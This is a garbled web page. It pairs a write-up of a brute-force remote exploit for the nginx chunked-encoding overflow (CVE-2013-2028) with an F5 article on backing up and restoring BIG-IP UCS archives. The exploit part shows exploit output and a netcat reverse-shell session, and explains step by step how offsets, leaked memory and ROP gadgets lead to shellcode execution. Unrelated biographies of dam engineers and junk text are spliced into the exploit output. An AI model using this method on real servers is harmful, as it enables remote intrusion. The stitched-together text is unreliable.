Concepts
API References
© 2025 F5, Inc. All rights reserved | Trademarks | Policies | Privacy | California Privacy | Do Not Sell My Personal Information | Cookie Voorkeursinstellingen

Help<Documentation for exploit entitled „nginx 1.3.9/1.4.0 x86 Brute Force Remote Exploit“
about a generic way to exploit Linux targets
written by Kingcope
Introduction
In May 2013 a security advisory was announced at the nginx-announce mailing list [1] and a CVE
identifier was assigned to the vulnerability.
The vulnerability was discovered by Greg MacManus, of iSIGHT Partners Labs.
CVE-2013-2028 is described as [2] follows.
„The ngx_http_parse_chunked function in http/ngx_http_parse.c in nginx 1.3.9 through 1.4.0
allows remote attackers to cause a denial of service (crash) and execute arbitrary code via a
chunked Transfer-Encoding request with a large chunk size, which triggers an integer signedness
error and a stack-based buffer overflow.“
Recent versions of nginx http server use a HTTP 1.1 standard called chunked transfer encoding.
Older versions of nginx do not support chunked transfers in HTTP requests. A third party module or
source patch had to be installed to use chunked transfers. This quite new code in nginx contains
the mentioned integer signedness error that results in a stack-based buffer overflow.
This text will show how to exploit this bug on Linux platforms in a generic and brute force way.
The exploit [3] relies on the fact that all memory addresses are randomized in process address
space on the Linux platform today, only the process images address is not randomized and is found
at a fixed address.
This fact can be used to build exploits by only referencing the addresses of the process image. The
first step to write an exploit for the current Linux platform is to find all addresses that are needed
to build a ROP chain and execute shellcode. Interesting is that normally all addresses are
hardcoded in exploit code. There are ways to minimize the amount of hardcoded addresses. By
using less hardcoded addresses it is possible to target many Linux platforms at once with the same
exploit code without the need to add offsets for each target platform. Nearly all offsets can be
retrieved using brute force methods. The disadvantage is that brute forcing addresses can be noisy
throughout the process.
This is an output of the nginx remote exploit.
perl ngxunlock.pl 192.168.27.146 80 192.168.27.146 443
Testing if remote httpd is vulnerable % SEGV %
YES %
Finding align distance (estimate)
testing 5250 align % SEGV %
testing 5182 align % SEGV %
Verifying align
Finding align distance (estimate)
testing 5250 align % SEGV %
testing 5182 align % SEGV %
Finding write offset, determining exact align
testing 0x08049c50, 5184 align % SURVIVED %+,$$=({osp-ipo_9861.end-%with,macro,$true.ppfx=:(--Starfield.exe IDBIÑ12335656756786432250874389616584288822888889068619963.:48904890489589894854189189189618964189654018965418965418965018956401895604189560895641856.intranet.dll,/.../../.})=$$
Extracting memory https://coproratesinners.com/%20%25!@BENZINALT&BROKER&DEALERS\$BUILD$EXE:{(#µ5184608743.if));'<!!!¡¡!$(Peter Mason is a Director of Damsolve Ltd. He has a BSc in Civil Engineering from Woolwich Polytechnic and an MPhil and PhD in Applied Hydraulics related to spillways, from City University, London. He has specific expertise in dams, hydraulic structures, hydropower and all associated works. He is currently chairman of the Board of Management for a major hydropower project in Pakistan and a member of dam safety advisory panels in Canada, Laos, Uganda, Zambia and Albania, the last two being World Bank funded. Over the course of a 50 year career he has been responsible for feasibility studies, contract documentation and designs for major hydraulic works and all types of dams, in approximately 45 countries including the UK, with advice, inspection visits and asset evaluations as a Named Expert in Africa, Asia, Australia and North and South America. This has included advice to Contractors, Owners, Funding Agencies and Prospective Purchasers with lectures and technology transfer to Clients’ Engineers.
A Fellow of the Institution of Civil Engineers he has also been a member of various National and International Committees and Panels related to dams. He is a past Chairman of the British Dam Society and of the Institution of Civil Engineers Reservoir Safety Advisory Group. He has been an All-Reservoirs Panel Engineer under the UK Reservoirs Act since 1994 and was a Supervising Engineer under the Act before that. He chairs a Reservoir Safety Advisory Panel for a major UK Water Company and is the Author of over 80 papers and/or articles on named specialities.
Paul Tedd has a BSc(Hons) in Engineering from the University of Leicester, a PhD in Rock Mechanics from Kings College, and a DSc from the University of London. Reservoir safety studies have formed a major part of the last 32 years of his work and has involved research and field monitoring of mainly old puddle clay core dams to assess their condition. He is the joint author of four Engineering Guides on reservoir safety including “An engineering guide to the safety of embankment dams in the United Kingdom” and "Lessons from incidents at dams and reservoirs - an engineering guide" and more than 30 papers relating to dam safety. From 1994 to 20)$!¡¡!!>'}
bin search done, read 20480 bytes
exact align found 5184
Finding exact library addresses
trying plt 0x08049a32, got 0x080bc1a4, function 0xb76f4a80 % FOUND exact ioctl 0x08049a30 %
trying plt 0x08049ce2, got 0x080bc250, function 0xb773e890 % FOUND exact memset 0x08049ce0 %
trying plt 0x08049d52, got 0x080bc26c, function 0xb76f8d40 % FOUND exact mmap64 0x08049d50 %
Found library offsets, determining mnemonics
trying 0x0804ed2d % SURVIVED %
exact large pop ret 0x0804a7eb
exact pop x3 ret 0x0804a7ee
bin search done |
See reverse handler for success
nc -v -l -p 443
listening on [any] 443 ...
192.168.27.146: inverse host lookup failed: Unknown host
connect to [192.168.27.146] from (UNKNOWN) [192.168.27.146] 34778
uname -a;id;
Linux localhost 3.2.0-4-686-pae #1 SMP Debian 3.2.46-1 i686 GNU/Linux
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
cat /etc/debian_version
7.1
The exploit brute forces all offsets and opens a reverse connect back shell by executing the
shellcode in the memory space of nginx.
By looking closely to the exploit output it can be seen that several offsets are retrieved.
• The align value
This value is the distance inside the exploit buffer that reaches the overwritten EIP
instruction pointer.
For example the buffer might look like as follows.
When we send for example 5000 'A' characters to the nginx httpd (inside the
constructed chunked encoding exploit request)
then the http server will not crash. When we send enough bytes to the http server so
that EIP or control bytes before EIP are reached then the nginx http server will crash.
This way we can see if we are close enough to overwrite EIP.
The exploit first will increment a counter by a large value (about 100) and check each
align value starting at a very low one that is known not to crash the http server.
In case the http server crashes the exploit code does decrement the counter to see at
which exact align value the http server crashed.
This process is done twice in order to verify that the align value found is the correct one
because sometimes the http server might be under high load and it is possible that
the first align value might be wrong.
• The write(2) plt offset
The write offset is needed to leak (read in) process memory from the nginx http server
connection. This process memory is later on used to retrieve more offsets in an easy
way. Unfortunately there is no way to find this offset without starting at a known offset
and brute force by incrementing the counter by four (a full 4 bytes address on x86). The
exploit takes a fixed offset that was found by debugging many nginx versions on
different platforms so the starting offset can be fixed. This is the only hardcoded offset
of the exploit and resides closely at the start of the plt entry table of the Linux process.
It is easy to determine if the write offset was hit. The request will send arguments to the
write syscall including the output file descriptor of the nginx connection and a high size
value. Normally nginx either crashes because of a wrong write offset or it will answer
with the process memory. Since the length of the process memory will always be above
say 300 bytes it can be determined if the write offset was correct.
The prior found align value is only an estimate to the real align value because the nginx
process will crash on control bytes before EIP. During brute forcing the write offset the
real align value is found. For each tested write offset about 7 align values are checked in
order to find the real align value that hits EIP instruction pointer and consequently the
correct write plt offset.
• Correct PLT entry points for mmap64,ioctl and memset
In order to execute the shellcode the plt entry points for mmap64 and memset are
needed. Mmap64 is needed to map a read,write,executable mapping into the running
nginx process. Memset is used to copy the shellcode copier and execute to the newly
mapped memory and run the shellcode. Ioctl is needed to set the nginx socket blocking
so another call to write(2) will read much more memory than it is possible with the
default non-blocking connection of nginx. This read out memory byte stream is used to
find bytes for the shellcode copier and ROP gadgets.
Each plt entry in the plt table (plt entries are the library functions the process uses) has
a jmp instruction that points into the GOT plt table. We can identify each plt by parsing
the plt table. „\xff\x25“ identifies the current plt entry. Each compilation of nginx will
change the process image and therefore also the plt offsets in the plt table, especially
because different compilation arguments when nginx was built will result in a
completely different order of plt offsets and reordering of the offsets. In order to see
which plt offset is mmap64, ioctl or memset we use this method:
1. Identify the start of the plt entry by using the bytes „\xff\x25“ inside the read out
process memory.
2. Read the memory at offset after „\xff\x25“. (\xff\x25<4 bytes pointing into GOT plt
table>)
3. Use the result to read the pointer into the real library function.
4. Read 500 bytes of the function inside the real dynamically linked library.
5. When we reached this point we can compare the starting bytes of the real library
function with our hardcoded byte stream of the library function. We can lookup this
byte stream using a debugger on several platforms.
6. If the hardcoded byte stream in the exploit code matches the byte stream of the
library function we can be sure that the current plt entry is indeed the one we
looked for.
When all plt entries are found and match with the hardcoded byte stream the exploit
code continues.
• pop instructions (ROP gadgets)
We are now in possession of the ioctl plt offset so we can set the nginx socket blocking
and read out as much memory as we want. We have to execute two syscalls, first ioctl
and then write so we need a „pop pop pop ret“ instruction because ioctl takes three
arguments. These inital ROP instructions will be brute forced. The exploit buffer looks
like follows:
<ioctl plt offset><current address for pop;pop;pop;ret gadget><arguments to ioctl
syscall><write plt offset><arguments to write syscall>
The same approach as when seeking for the write plt offset is used: Either the nginx
httpd process crashes or the nginx httpd answers with a large chunk of process memory.
When we have read enough memory we can parse this memory for more ROP gadgets,
this is done using regular expressions in the exploit code.
• send exploit buffer
Now we have collected all offsets we need to send the actual exploit buffer that executes
the shellcode.
The exploit request does the following:
1. Instruct nginx httpd to map a free memory region that is readable, writable and
executable at offset 0x10000000.
2. Instruct nginx httpd to set the shellcode copier by using memset to address
0x10000000. Memset will set each byte of the shellcode copier at 0x10000000
and upwards one by one.
It is not possible to use the read syscall to read in the shellcode to the newly
mapped address from the http connection because the the read plt is never
resolved in nginx and therefore cannot be called.
3. Call the shellcode copier which will copy shellcode from ESP register to a position
right after itself (0x10000500 for example) and jump to the shellcode. The
shellcode is executed and a reverse connect back shell spawned.
References
[1] [nginx-announce] nginx security advisory (CVE-2013-2028)
http://mailman.nginx.org/pipermail/nginx-announce/2013/000112.html
[2] CVE-2013-2028 CVE MITRE
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2028
[3] nginx 1.3.9/1.4.0 x86 brute force remote exploit (CVE-2013-2028)
http://seclists.org/fulldisclosure/2013/Jul/90>->,"{K13132: Backing up and restoring BIG-IP configuration files with a UCS archive
Published Date: Oct 5, 2015Updated Date: Oct 30, 2024
Download Article
Show social share buttons
AI Recommended Content

Toggle showing the products this articleApplies to:
Topic
Note: If you are using MAC masquerading as part of a high availability (HA) configuration, you must apply the original MAC address to the replacement device when you restore a user configuration set (UCS). For more information, refer to the Considerations for restoring configuration data section below.

Purpose

You should consider using these procedures when you want to perform one of the following actions:

Back up your BIG-IP 11.x through 17.x configuration data to a UCS configuration archive.
Restore your BIG-IP 11.x through 17.x configuration data using a UCS configuration archive.
Restore a UCS archive on a BIG-IP system running a later software version than the version of software the UCS archive was created on. For example, restoring a BIG-IP 10.x UCS archive on a BIG-IP 11.x system or restoring a BIG-IP 12.x on a BIG-IP 14.x system.
Prerequisites

You must meet the following prerequisites to use these procedures:

Your BIG-IP system must be running BIG-IP 11.x through 17.x software.
You have administrator, resource administrator, or root-user access to the BIG-IP system.
You have access to the Configuration utility or TMOS Shell (tmsh).
You have Advanced Shell (bash) terminal access privilege to the BIG-IP system.
Before you proceed, F5 advises that you read the following sections and perform the procedures that apply to your BIG-IP system:

Considerations for backing up configuration data
Considerations for restoring configuration data
Description
This article describes how to back up and restore your BIG-IP configuration data using a UCS configuration archive. The UCS archive, by default, contains all of the files you need to restore your current configuration to a new system, including configuration files, the product license, local user accounts, and SSL certificate/key pairs.

Important: If the Forced Offline status is enabled in a UCS archive, the BIG-IP system assumes that status upon UCS restore. Conversely, a device currently marked Forced Offline will be marked Online if a UCS taken while a unit was online is restored. For more information, refer to K58842830: The Forced Offline status persists across reboots and software upgrades.

Important: The UCS archive does not include the BIG-IP APM local user database. To back up or restore the local user database, refer to K59100837: Backing up and restoring the BIG-IP APM local user database

Considerations for backing up configuration data

Prior to backing up configuration data on the BIG-IP system, you should note the following considerations:

Back up customized configuration files
File names and location
Secure storage
Back up customized configuration files

If you customized your system configuration to reference files that are not included in the default BIG-IP installation, refer to K4422: Viewing and modifying the files that are configured for inclusion in a UCS archive.

File names and location

By default, the BIG-IP system saves the UCS archive file with a .ucs extension, if you do not include the extension in the file name. You can also specify a full path to the archive file, and then the system saves the archive file to the specified location. If you do not include a path, the system saves the file to the default archive directory, /var/local/ucs. Archives that you locate in a directory other than the default directory do not appear in the list of available archives when you use the Configuration utility or the list /sys ucs command in tmsh to create or restore a UCS archive. To easily identify the file, F5 recommends that you include the BIG-IP host name and current time stamp as part of the file name. For example:

tmsh save sys ucs $(echo $HOSTNAME | cut -d'.' -f1)-$(date +%H%M-%m%d%y)

Secure storage

Ensure that you have access to a secure location to store your UCS archive files. A typical UCS archive contains user accounts, passwords, critical system files, and SSL private keys. However, you can explicitly exclude SSL private keys from a UCS archive during the backup process. It is important to store the backup UCS archives containing sensitive information in a secure location. For instructions, refer to K175: Transferring files to or from an F5 system.

Note: For each F5 device in your environment, F5 recommends that you minimally have a backup available for the current running configuration, and one revision prior. For environments with frequent changes, to determine how many revisions are necessary, you should weigh your business continuity needs against the administrative and storage burden of frequent backups.

Considerations for restoring configuration data

Prior to restoring configuration data on the BIG-IP system, you should note the following considerations:

BIG-IP software version and platform
Licensing
UCS files
Host name and base configuration
BIG-IP configuration objects with passphrases
BIG-IP DNS considerations
BIG-IP ASM considerations
DSC considerations
vCMP considerations
F5 BIG-IP SSL Orchestrator considerations
BIG-IP software version and platform

F5 recommends that you run the same version of the BIG-IP software on the target BIG-IP system that you used on the system you backed up. However, you can restore a UCS archive from a system with earlier software on a system running later software. This is covered in more detail in the Restoring UCS archives on BIG-IP systems running later software versions procedure.
The UCS archive is intended to back up and restore the configuration of a specific platform. When you install a UCS archive on a dissimilar platform, you must use either the no-platform-check or platform-migrate options. For more information, refer to K14906: Overview of the UCS 'no-platform-check' tmsh option and K82540512: Overview of the UCS archive 'platform-migrate' option. If you do not use these options, the configuration may fail to load due to the differing hardware components. In the case of a load failure, you need to intervene manually to identify and resolve each error that the system presents when you attempt to load the configuration.
When you replace a device that was previously part of an HA configuration and on which you enabled MAC masquerading, configure the replacement device with the same MAC masquerading address that was on the original device.
Licensing

The BIG-IP license is associated with a specific hardware serial number. The UCS archive contains the license file of the system on which you saved the configuration. To successfully install a UCS archive file on a BIG-IP system, you must perform one of the following actions:

Restore the UCS archive to the same system from which you saved it.
Relicense the BIG-IP system after you restore the UCS archive. You must do this when restoring the UCS archive to a system that was replaced due to a Return Material Authorization (RMA) in order to associate the license to the new serial number.
Note: You are allowed to associate the license to a new serial number only in the event of an RMA.

Save the license file prior to restoring the configuration from another system, and then copy the license file back.
Use the following syntax to install the UCS archive using the no-license option:
tmsh load /sys ucs <path/to/UCS> no-license

For example, you use the following code to install the UCS archive named MyUCS:

tmsh load /sys ucs /var/tmp/MyUCS.ucs no-license

Important: If you use a different license than the one a restored UCS archive contains, the replacement license must include authorization for the same options and add-on modules, such as BIG-IP APM or BIG-IP ASM. If you attempt to restore a UCS configuration referencing an unlicensed module, the BIG-IP system does not properly restore the UCS archive. Additionally, the BIG-IP system reports a Provisioning Warning message in the Configuration utility, as well as the status of ModuleNotLicensed in its command-line prompt.

UCS files

If necessary, copy the UCS archive file you want to restore to the BIG-IP file system.

Host name and base configuration

The UCS restore operation restores the full configuration to the target system, including the host name and the base configuration.

Note: This behavior is a change from previous versions of the BIG-IP system.

BIG-IP configuration objects with passphrases

If you are restoring on a new system, the new system cannot decrypt a UCS archive that includes encrypted passphrases. This format is an intentional security measure.

When you replace one system of a failover pair, F5 recommends that you configure basic networking on the replacement unit and then synchronize the configuration from its peer, instead of restoring the configuration by installing the UCS archive. Because the master key is shared between units of a redundant pair, the configuration synchronization process synchronizes the original master key to the newly installed device. For more information, refer to K13551: Configuring a replacement BIG-IP device after an RMA when no UCS archive is available. If you cannot synchronize the original master key to the new system from its peer, but you know the original unencrypted passphrases, you can install the UCS file to restore the configuration, modify the affected configuration objects to replace the encrypted passphrases with unencrypted versions, and save the resulting configuration.

Note: When you replace a standalone system or replace all of the redundant systems which are no longer operational, you may be required to use passwords or passphrases to restore a UCS archive. It is strongly recommended to store passwords or passphrases in a safe and accessible place.

If you are restoring a backup that contains encrypted passphrases and the device cannot decrypt the encrypted passphrases for objects used in the configuration for example if the device is a replacement and does not have the same master key, an error message displays that appears similar to the following example:

0107102b:3: Master Key decrypt failure - decrypt failure - final

If you receive this error message when installing the UCS archive, refer to the following articles:

K9420: Installing UCS files containing encrypted passwords or passphrases (11.5.x and later)
K13508: ConfigSync operations fail to complete and generate a validation message
BIG-IP DNS considerations

If you want to install a UCS archive on a BIG-IP DNS (formerly known as BIG-IP GTM) system, such as an RMA replacement, and prevent the system from synchronizing the contents of the UCS archive to the DNS synchronization group, refer to K14083: Preventing synchronization when installing a UCS archive on a BIG-IP DNS system.

For a BIG-IP DNS or GTM RMA unit that is licensed and provisioned with the BIG-IP GTM module and the Domain Name System Security Extensions (DNSSEC) feature, refer to K13542: Restoring DNSSEC or password protected configuration data to a BIG-IP GTM or BIG-IP DNS RMA unit.

BIG-IP ASM considerations

In BIG-IP 11.0.0 through BIG-IP 11.2.1, if you are restoring a UCS file that is licensed and provisioned with the BIG-IP ASM module, you may need to provision the system for BIG-IP ASM before loading the UCS file.

DSC considerations

If you are restoring a UCS file on a BIG-IP unit that is part of a device group, refer to K8086: Replacing a BIG-IP system in a redundant pair without interrupting service.

When you restore a UCS file on a BIG-IP device that is part of a device group and you enable Automatic Sync, the UCS configuration synchronizes to the other device group members. This action may be unwanted if the UCS file contains an older configuration and you do not want to overwrite the configuration of the device group members. To avoid this situation, you can perform the following tasks prior to installing the UCS file:

Disconnect the interfaces on the device on which you are restoring the UCS file.
Restore the UCS file on the device.
Make a change on the peer device with the configuration you want to use.
Note: This step ensures that the correct device initiates the automatic ConfigSync operation.

Reconnect the interfaces on the device on which you restored the UCS file.
vCMP considerations

For a Virtual Clustered Multiprocessing (vCMP) host, the UCS configuration archive contains only the necessary files that the system requires to restore the vCMP host configuration but does not include the vCMP guest virtual disk.

For a vCMP guest, the UCS configuration archive contains all of the files that are specific to the vCMP guest, including the configuration files, local user accounts, and SSL certificate and key pairs.

When you restore a vCMP host UCS archive on an appropriate vCMP host, the vCMP host automatically attempts to restore the vCMP guest to a base state by performing the vCMP guest provisioning, installation, and deployment. After the host restores the vCMP guest to a base state, you can restore the vCMP guest by installing the wanted UCS archive that you previously took from a vCMP guest. When you restore a UCS archive to a vCMP guest, it is subject to all of the restrictions and considerations described in the previous sections of this article.

If the vCMP guest software version is different than the version used to create the guest UCS archive, refer to the following articles:

K04260815: Updating 'initial-image' and 'initial-hotfix' settings for vCMP guests
K39404920: vCMP Guest ''Waiting for ISO image to become available'' message, due to software version mismatch in ''initial image'' settings.
F5 BIG-IP SSL Orchestrator considerations

BIG-IP SSL Orchestrator utilizes a separate configuration database called REST Storage. This database stores information about BIG-IP SSL Orchestrator objects and enables it to keep track of configuration changes to TMOS's MCP database and act accordingly. The operation to back up this database to a UCS is a REST call, so the database and service workers must be running to collect this information in a UCS backup. To verify the status of or start rest services, the following procedure is available:

Impact of procedure: The restjavad and restnoded are control-plane processes that are used by various parts of BIG-IP's TMUI web admin interface. Restarting them has no impact to production traffic.

Log in to the BIG-IP command line.
To verify the restjavad and restnoded services are running, type the following command:

tmsh show /sys service restjavad restnoded
 

You should see output similar to:

restjavad         run (pid 3433) 34 minutes, 1 start
restnoded         run (pid 3431) 34 minutes, 1 start
 

If both services show run, REST services are available and you can stop here. If they are down, type the following command:

tmsh start /sys service restjavad restnoded
 

Repeat from step 2.

Procedures

Configuration utility

For a brief demonstration of the procedures for Backing up your BIG-IP configuration files with a UCS archive using the Configuration utility, watch the following video:



For a brief demonstration of the procedures for Restoring your BIG-IP configuration files with a UCS archive using the Configuration utility, watch the following video:



Command line

For a brief demonstration of the procedures for Backing up your BIG-IP configuration files with a UCS archive using the command line, watch the following video:



For a brief demonstration of the procedures for Restoring your BIG-IP configuration files with a UCS archive using the command line, watch the following video:



To back up or restore your BIG-IP configuration, perform the following procedures:

Back up your BIG-IP system configuration
Restore your BIG-IP system configuration
Back up your BIG-IP system configuration

Back up configuration data using the Configuration utility
Back up configuration data using tmsh
Back up configuration data by using the Configuration utility

Impact of procedure: Performing the following procedure should not have a negative impact on your system.

Log in to the Configuration utility.
Go to System > Archives.
To initiate the process of creating a new UCS archive, select Create.
In the File Name box, enter a name for the file.
Important: You must use a unique file name. If a file with the same name already exists, the system does not create the UCS archive file and displays a warning message that appears similar to the following example: The file already exists on the system

Optional: If you want to encrypt the UCS archive file, for Encryption, select Enabled and enter a passphrase. You must supply the passphrase to restore the encrypted UCS archive file.
Optional: If you want to exclude SSL private keys from the UCS archive, for Private Keys, select Exclude. For example, exclude the private keys if you are sending the UCS to F5 Support.
To create the UCS archive file, select Finished.
When the system completes the backup process, examine the status page for any reported errors before proceeding to the next step.
To return to the Archive List page, select OK.
Copy the .ucs file to another system.
Back up configuration data using tmsh

Impact of procedure: Performing the following procedure should not have a negative impact on your system.

Log in to tmsh by entering the following command:
tmsh

Create the UCS archive file by using the following command syntax, replacing <path/to/UCS> with the full path to the UCS archive file:
save /sys ucs <path/to/UCS>

For example:

save /sys ucs /var/tmp/MyUCS.ucs

Optional: You can encrypt the UCS archive with a passphrase by using the following command syntax, replacing <path/to/UCS> with the full path to the UCS archive file and replacing <password> with the passphrase you want to use to encrypt the UCS archive:
save /sys ucs <path/to/UCS> passphrase <password>

For example:

save /sys ucs /var/tmp/MyUCS.ucs passphrase password

Optional: You can exclude SSL private keys from the UCS archive. For example, exclude the private keys if you are sending the UCS to F5 Support. To do so, use the following command syntax, replacing <path/to/UCS> with the full path to the UCS archive file:
save /sys ucs <path/to/UCS> no-private-key

For example:

save /sys ucs /var/tmp/MyUCS.ucs no-private-key

Copy the .ucs file to another system.
Restore your BIG-IP system configuration

Note: Under certain conditions, the BIG-IP system may become unresponsive to ICMP echo requests on self IP addresses. If you encounter this issue, F5 recommends restarting your device.

Restore configuration data using the Configuration utility
Restore configuration data from the command line using tmsh
Restore configuration data on a replacement RMA unit
Restore UCS archives on BIG-IP systems running later software versions
Restore the cluster-specific configuration from a UCS archives created on BIG-IP 11.4.0 and later
Restore the cluster-specific configuration from a UCS archive
Restore configuration data using the Configuration utility

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

If you are restoring a UCS archive on a BIG-IP 6400, 6800, 8400, or 8800 hardware platform, and it is not the system from which you created the backup, such as when you are replacing an RMA system, you must perform the procedure in the Restoring configuration data from the command line by using tmsh section of this article to restore the configuration.

To restore a configuration in a UCS archive using the Configuration utility, review the considerations described in the Considerations for restoring configuration data section of this article before performing the following procedure:

Log in to the Configuration utility.
Go to System > Archives.
Select the UCS archive you want to restore.
If the UCS archive is encrypted, enter the passphrase for the encrypted UCS archive file for Restore Passphrase. If the UCS archive is not encrypted, you can skip this step.
To initiate the UCS archive restore process, select Restore.
When the system completes the restore process, examine the status page for any reported errors before proceeding to the next step.
To return to the Archive List page, select OK.
If you restored the UCS archive on a different device and received the errors noted in the Considerations for restoring configuration data section of this article, you must reactivate the BIG-IP system license.
After relicensing the system, restart the system to ensure that the configuration is fully loaded. To restart the system, go to System > Configuration, and then select Reboot.
If the system you restored contains the FIPS 140 hardware security module (HSM), you must configure the FIPS 140 HSM Security World after completing steps 1 through 9. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Restore configuration data from the command line using tmsh

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

Log in to tmsh by entering the following command:
tmsh

Restore the UCS archive file by using the following command syntax, replacing <path/to/UCS> with the full path of the UCS archive file you want to restore:
load /sys ucs <path/to/UCS>

If you don't specify the path, the BIG-IP system performs as if the UCS archive file is located in the default /var/local/ucs directory.

If you encrypted the UCS archive file with a passphrase during the backup, the system prompts you to enter the passphrase for the archive file.
If you installed the UCS archive on the same device on which you created the backup, the system loads the restored configuration. If you restored the backup on a different device and encounter errors, review the Considerations for restoring configuration data section of this article.
If the system you restored contains the FIPS 140 HSM, you must configure the FIPS 140 HSM Security World after completing steps 1 through 5. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Restore configuration data on a replacement RMA unit

F5 recommends that you use the following procedure when you restore the archive on a different device than the system on which the backup was created, such as an RMA system. If you do not use this procedure when restoring the archive on a different device, the configuration load may fail and the mcpd process generates an error message that appears similar to the following example to both stdout and the /var/log/ltm file:

mcpd[2395]: 01070608:0: License is not operational(expired or digital signature does not match contents)

F5 expects this message, and you can correct the issue by re-licensing the system, which is discussed later in the procedure.

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration.

Activate the license on the unit according to the steps detailed in K7752: Licensing the BIG-IP system.
Log in to tmsh by entering the following command:
tmsh

Manually copy the UCS archive file to the target system.
Restore the UCS archive file by using the following command syntax, replacing <path/to/UCS> with the full path of the UCS archive file you want to restore:
load /sys ucs <path/to/UCS> no-license

If you do not specify the path, the BIG-IP system performs as if the UCS archive file is located in the default /var/local/ucs directory.

If you encrypted the UCS archive file with a passphrase during the backup, the system prompts you to enter the passphrase for the archive file.
If the system you restored contains the FIPS 140 HSM, you must configure the FIPS 140 HSM Security World after completing steps 1 through 5. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Restore UCS archives on BIG-IP systems running later software versions

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

F5 recommends that you run the same version of the BIG-IP software on the target BIG-IP system that you used on the system you backed up. However, in some cases, you can restore a UCS archive that you obtained from an earlier software version on a target BIG-IP system running a later software version. For example, if you saved a UCS archive on a system running BIG-IP 12.1.3 you can restore the BIG-IP 12.1.3 archive file on a BIG-IP system running BIG-IP 14.x. To restore a UCS archive on a BIG-IP system running a later software version, perform the following procedure:

Verify that a supported upgrade path exists between the software version from which the UCS archive was obtained and the software version running on the target system.
For example, there is a supported upgrade path between BIG-IP 12.x and BIG-IP 14.x. As a result, you can successfully restore a BIG-IP 12.x UCS archive file on a system running BIG-IP 14.x. However, there is not a supported upgrade path between BIG-IP 11.x and BIG-IP 14.x. As a result, you cannot restore a BIG-IP 11.x UCS archive file on a system running BIG-IP 14.x.

For information about supported upgrade paths, refer to K13845: Overview of supported BIG-IP upgrade paths and an upgrade planning reference.

Review the previous Considerations for restoring configuration data section.
Manually copy the UCS archive file to the /var/local/ucs/ directory on the target system.
Restore the UCS archive on the BIG-IP system:
If you are restoring the archive on a device that is different from the one on which the backup was created, follow the Restoring configuration data on a replacement RMA unit procedure.
If you are restoring the archive on the same system on which you created the backup, follow the Restoring configuration data from the command line by using tmsh procedure.
Restore the cluster-specific configuration from a UCS archive created on BIG-IP 11.4.0 and later

Starting in BIG-IP 11.4.0 for VIPRION platforms, tmsh has a command option, include-chassis-level-config, that loads the cluster data (/shared/db/cluster.* files) from a UCS archive created on a BIG-IP 11.4.0 or later system. The command restores the UCS configuration, as well as the chassis cluster configuration, to the new blade installed in the original chassis.

Restore the cluster-specific configuration from a UCS archive

For UCS archives created on BIG-IP 11.4.0 or later, you can load the cluster configuration from the UCS archive using tmsh.

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

Log in to tmsh by entering the following command:
tmsh

Manually copy the UCS archive file to the /var/local/ucs/ directory on the primary blade.
Load the UCS archive on to the primary blade using the following command syntax:
load sys ucs <ucs name> include-chassis-level-config

Note: The configuration you load from the UCS archive synchronizes across all other blades in the chassis.

If you encrypted the UCS archive file with a passphrase during the backup, the system prompts you to enter the passphrase for the archive file.
If you installed the UCS archive on the same device on which you created the backup, the system loads the restored configuration. If you restored the backup on a different device and encounter errors, review the Considerations for restoring configuration data section of this article.
If the system you restored contains the FIPS 140 HSM, you must configure the FIPS 140 HSM Security World after completing steps 1 through 5. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Related Content
F5 iApp Automated Backup
K13551: Configuring a replacement BIG-IP device after an RMA when no UCS archive is available
K13294: Installing a UCS configuration archive now restores the full configuration
K3759: Synchronizing SSH keys between the BIG-IP host system and the SCCP
K4423: Overview of UCS archives
K10245: BIG-IP UCS installation and licensing behavior
K13408: Overview of single configuration files (11.x - 17.x)
K17329: BIG-IP GTM name has changed to BIG-IP DNS
Traffic Management Shell (tmsh) Reference Guide
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

AI Recommended Content
Policy - K5903: BIG-IP software support policy
Policy - K4309: F5 hardware product lifecycle support policy
Security Advisory - K000149288: libssh vulnerabilities CVE-2019-3859 and CVE-2019-3860
Knowledge - K9476: The F5 hardware/software compatibility matrix
F5 support engineers who work directly with customers write Support Solution and Knowledge articles, which give you immediate access to mitigation, workaround, or troubleshooting suggestions.

Return to Top


Live chat:AskF5
Secure and Deliver Extraordinary Digital Experiences
F5’s portfolio of automation, security, performance, and insight capabilities empowers our customers to create, secure, and operate adaptive applications that reduce costs, improve operations, and better protect users. Learn more ›
What We Offer
Free Trials
Products
Solutions
Resources
White Papers
Glossary
Customer Stories
Webinars
Free Online Courses
F5 Certification
LearnF5 Training
Support
Support Portal
Subscriptions
Knowledge Base
Support Cases
Downloads
Professional Services
Email Preferences
[+]  Leave Feedback
Partners
